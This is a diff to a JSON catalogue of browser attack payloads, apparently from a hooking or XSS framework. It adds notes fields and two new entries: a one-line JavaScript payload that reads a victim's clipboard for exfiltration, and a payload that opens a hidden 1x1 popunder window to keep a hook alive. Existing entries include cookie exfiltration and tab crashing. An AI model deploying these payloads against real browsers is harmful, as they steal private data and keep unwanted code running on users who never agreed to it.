@@ -7,7 +7,8 @@
       "compatibility": "All Browsers",
       "type": "Misc.",
       "author": "wagyu",
-      "risk": 5
+      "risk": 5,
+      "notes": ""
     },
     {
         "name": "crash-tab",
@@ -16,7 +17,8 @@
         "compatibility": "All Browsers",
         "type": "Misc.",
         "author": "wagyu",
-        "risk": 5
+        "risk": 5,
+        "notes": ""
     },
     {
         "name": "rickroll",
@@ -25,7 +27,8 @@
         "compatibility": "All Browsers",
         "type": "Misc.",
         "author": "wagyu",
-        "risk": 5
+        "risk": 5,
+        "notes": ""
     },
     {
       "name": "exfil-cookies",
@@ -34,6 +37,27 @@
       "compatibility": "All Browsers",
       "type": "Data Exfiltration",
       "author": "wagyu",
-      "risk": 1
+      "risk": 1,
+      "notes": ""
+    },
+    {
+      "name": "exfil-clipboard",
+      "description": "Exfiltrate the victims clipboard.",
+      "payload": "setData('clipboard', navigator.clipboard.readText());",
+      "compatibility": "All Browsers*",
+      "type": "Data Exfiltration",
+      "author": "wagyu",
+      "risk": 4,
+      "notes": "*Only works on browsers that support the clipboard API. Firefox will require it to be enabled in about:config"
+    },
+    {
+      "name": "popunder-window",
+      "description": "Open a duplicate popunder hidden window of the current tab",
+      "payload": "window.open(window.location,'test','left='+window.innerWidth+1+',top='+window.innerHeight-1+',toolbar=0,,menubar=0,scrollbars=0,resizable=0,width=1,height=1').blur();",
+      "compatibility": "All Browsers*",
+      "type": "Persistence",
+      "author": "wagyu",
+      "risk": 3,
+      "notes": "* Newer browsers ask for permission"
     }
   ]
